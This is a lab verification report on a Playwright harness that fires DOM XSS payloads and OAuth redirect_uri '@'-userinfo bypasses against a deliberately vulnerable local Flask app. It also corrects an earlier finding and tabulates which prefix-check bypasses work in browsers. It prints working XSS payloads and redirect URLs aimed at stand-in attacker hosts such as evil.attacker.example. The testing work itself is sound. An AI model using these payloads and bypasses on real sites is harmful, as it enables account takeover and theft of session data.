# Verification — Phase 3.1: Playwright browser-execution harness

> Closes the "source-verified only" gap from Phase 2F. Real headless Chromium executes the payloads and we read the DOM / nav chain to confirm. Three browser-side tests, three honest outcomes — including a **correction** to a Phase 2F overclaim that source-verification missed.

## Why this matters

Phase 2F Test 3 (DOM XSS in Juice Shop search) verified the SINK shape by reading the Angular source code — but never executed the payload in a browser. Phase 2F Test 14 Attack B (OAuth `@`-userinfo bypass) verified that the server accepted the URL — but never confirmed the browser actually navigates cross-origin.

Both gaps were called out in the original verification docs. Phase 3.1 closes them via Playwright + headless Chromium.

## Target

`/tmp/phase3-playwright/target_app.py` — minimal Flask app with:

| Endpoint | Vulnerability |
|---|---|
| `GET /dom-xss` | `location.hash` → `innerHTML` sink. The canonical DOM XSS pattern. |
| `GET /oauth/authorize` | redirect_uri validated by prefix match (`http://localhost:58020`) — same shape as Phase 2F |

Shipped at `docs/verification/phase3-playwright/`.

```bash
mkdir -p /tmp/phase3-playwright && cd /tmp/phase3-playwright
python3 -m venv .venv && source .venv/bin/activate
pip install flask playwright
playwright install chromium
python target_app.py &   # Flask target on :58020
python harness.py         # Run the Playwright tests
```

---

## Test 28a — DOM XSS via alert dialog

```python
payload = '<img src=x onerror="alert(\'xss-via-playwright-2026\')">'
page.on("dialog", lambda d: alerts.append(d.message))
page.goto(f"http://localhost:58020/dom-xss#{payload}")
```

### Result

```
✓ ALERT FIRED — message: xss-via-playwright-2026
```

Chromium executed `onerror` and fired `alert()`. DOM XSS confirmed at **execution time**, not just at the sink.

### Verdict
**PASS — browser-level DOM XSS confirmed.**

---

## Test 28b — DOM XSS via window variable

A more robust primitive when CSP, popup blockers, or sandbox modes suppress dialogs.

```python
payload = '<img src=x onerror="window.bughunter_xss_executed=true">'
page.goto(f"http://localhost:58020/dom-xss#{payload}")
executed = page.evaluate("window.bughunter_xss_executed === true")
```

### Result

```
✓ window.bughunter_xss_executed === true — JS executed in DOM
```

### Verdict
**PASS — DOM XSS confirmed via persistent JS side-effect.**

This is the harness pattern to use for stored XSS verification — the window variable survives across navigations within the same origin.

---

## Test 29 — OAuth `@`-userinfo bypass + Phase 2F correction

Phase 2F Test 14 Attack B claimed that submitting `redirect_uri=https://acme.example/@evil.attacker.example/` against a server with prefix `https://acme.example/` (note trailing slash) would land the auth code on `evil.attacker.example`.

**Browser verification disproves that specific claim and identifies the correct attack shape.**

### Phase 3.1 attempt 1 — Phase 2F shape against trailing-slash prefix

```python
# Server prefix:   http://localhost:58020/legit/
# Attacker URL:    http://localhost:58020/legit/@evil.attacker.example/x
```

Browser navigation captured:
```
host=localhost  port=58020  path=/legit/@evil.attacker.example/x
```

**Browser kept the `@` as a path character.** Per WHATWG URL spec, userinfo is parsed only in the authority section — i.e., **before the first `/` after `://`**. Once the URL has `://host/`, everything after the `/` is path. The `@` later in the path doesn't make it userinfo.

So the original Phase 2F claim was **wrong for that specific lab**: server-side prefix-check accepted the URL, but the browser never reached `evil.attacker.example`.

### Phase 3.1 attempt 2 — correct attack shape (no-trailing-slash prefix)

The bypass IS real, but only against a prefix-check that doesn't enforce a trailing-slash boundary:

```python
# Server prefix:   http://localhost:58020   (NO trailing slash)
# Attacker URL:    http://localhost:58020@evil.attacker.example/attacker-callback
```

The `@` is now in the authority section (before any `/`). Browser parses:

- scheme: `http`
- userinfo: `localhost:58020` (the part before `@`)
- **host: `evil.attacker.example`**
- path: `/attacker-callback`

Server-side `redirect_uri.startswith("http://localhost:58020")` returns `True` — string check passes. Server issues 302 to the same URL.

Browser navigates to `evil.attacker.example`. DNS fails (the domain doesn't exist) but the failed-request capture confirms the browser TRIED to reach `evil.attacker.example`:

```
Failed (DNS-blocked):
  host=evil.attacker.example  path=/attacker-callback  err=net::ERR_NAME_NOT_RESOLVED

✓ PROVEN — browser navigated cross-origin to evil.attacker.example
  The OAuth auth code would have been transferred to attacker.
```

### Verdict

**The vulnerability class is real, but specific lab configuration determines whether the `@`-bypass is the right tool.**

| Server-side prefix shape | Working bypass |
|---|---|
| `http://acme.example` (no slash) | `@`-userinfo: `http://acme.example@evil/` |
| `http://acme.example/` (trailing slash) | `@`-userinfo does NOT work in browsers; need path-traversal, open-redirect chain, subdomain takeover, or backslash-tricks |
| `http://acme.example` (substring match) | Subdomain extension: `http://acme.example.evil.com/` |

**Phase 2F Test 14 Attack B is corrected to reflect this.**

---

## Phase 2F correction → `docs/verification/phase2f-ssti-oauth-fileupload.md`

Add to Phase 2F's Attack B writeup:

> **Phase 3.1 correction:** Browser-execution verification (`docs/verification/phase3-playwright-browser-execution.md` Test 29) confirms that against a `https://acme.example/` (trailing-slash) prefix, browsers parse the `@` as a path character — the auth code lands at `acme.example`, not at the attacker. The `@`-userinfo bypass requires the prefix to have NO trailing slash (or for the server check to be substring-match instead of `startswith`). The vulnerability class is real but the specific Phase 2F lab configuration would NOT have been exploitable in a real browser as originally claimed.
>
> Operationally: when the server-side prefix-check passes against an `@`-shaped URL, run a Playwright (or curl-equivalent) check of the actual browser navigation BEFORE writing the finding as ATO-chain — the server-side accept and the browser-side navigation are different gates.

## Skill content update → `hunt-oauth/SKILL.md`

Add a "Browser-parse vs server-parse" subsection clarifying:

> When the server's `redirect_uri` validator uses a prefix-match, ALL of the following pass server-side BUT have different browser behavior:
>
> | Attack URL | Server `startswith()` check | Browser actual host |
> |---|---|---|
> | `https://acme.example/x` | passes | acme.example ✓ |
> | `https://acme.example.attacker.com/x` | passes (substring match!) — fails strict-startswith | acme.example.attacker.com — **exploit** |
> | `https://acme.example@attacker.com/x` | passes (prefix is `https://acme.example`, no slash) | attacker.com — **exploit** |
> | `https://acme.example/@attacker.com/x` | passes (prefix is `https://acme.example/`) | acme.example (path normalization) — **NOT exploit** |
> | `https://acme.example/../@attacker.com/x` | passes (passes startswith) | acme.example (path traversal normalized) — usually NOT exploit |
> | `https://acme.example/\@attacker.com/x` | passes | depends on backslash handling per browser — sometimes exploit |
>
> Operational rule: server-side prefix-match flaw is necessary but NOT sufficient for browser-level ATO. Always headless-test the final navigation when claiming an OAuth chain → ATO finding.

---

## Summary — Phase 3.1

| # | Test | Result |
|---|---|---|
| 28a | DOM XSS via alert dialog | PASS — alert fired in headless Chromium |
| 28b | DOM XSS via window variable | PASS — JS executed in DOM |
| 29 | OAuth `@`-userinfo browser navigation | **Real vulnerability confirmed against no-slash prefix; Phase 2F overclaim corrected.** |

**3 / 3 honest outcomes.** Two clean execution PASSes + one Phase 2F correction that makes the doc accurate.

The harness (`harness.py`) is shipped — anyone can re-run and verify.

## What the harness enables for future verifications

- **Stored XSS confirmation**: post payload via API, then navigate to display page, check window variable
- **Open redirect chains**: visit chain URLs, check final destination host
- **CSRF + token-binding tests**: visit attacker page, intercept the cross-origin request the browser sends, check Origin / SameSite behavior
- **DOM clobbering / DOMpurify bypass tests**: same window-variable read pattern
- **Cookie-jar / session-after-XSS tests**: read `document.cookie` from inside the executed payload

## Cleanup

```bash
pkill -9 -f "phase3-playwright/target_app"
```
